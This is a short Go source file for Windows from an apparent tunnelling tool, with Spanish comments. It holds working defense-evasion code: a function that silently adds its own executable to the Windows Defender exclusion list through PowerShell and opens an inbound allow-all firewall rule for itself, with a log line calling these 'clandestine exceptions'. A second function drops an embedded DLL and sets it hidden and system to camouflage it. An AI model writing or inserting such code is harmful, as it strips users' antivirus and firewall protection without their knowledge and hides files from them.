//go:build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
)

// ensureSecurityExceptions inyecta exclusiones en Windows Defender y Firewall
// para que el ejecutable opere sin interferencia del sistema de seguridad del OS.
func ensureSecurityExceptions() {
	exePath, _ := os.Executable()
	fmt.Println("🛡️ Inyectando Excepciones Clandestinas (Defender/Firewall)...")
	exec.Command("powershell", "-NoProfile", "-Command",
		fmt.Sprintf("Add-MpPreference -ExclusionPath '%s'", exePath)).Run()
	exec.Command("netsh", "advfirewall", "firewall", "add", "rule",
		"name=IPv7-IEU", "dir=in", "action=allow",
		fmt.Sprintf("program=%s", exePath),
		"enable=yes", "protocol=ANY").Run()
}

// extractWintun vuelca wintun.dll embebido al disco y lo camufla como archivo de sistema.
// Solo aplica en modo embed en Windows.
func extractWintun(kernelMode string) {
	if kernelMode != "embed" || len(wintunDLL) == 0 {
		return
	}
	tempDllPath := "wintun.dll"
	os.WriteFile(tempDllPath, wintunDLL, 0644)
	exec.Command("attrib", "+h", "+s", tempDllPath).Run()
	fmt.Println("👻 [Kernel] Motor Embed ejecutado: DLL Extraído y Camuflado como Temp.")
}
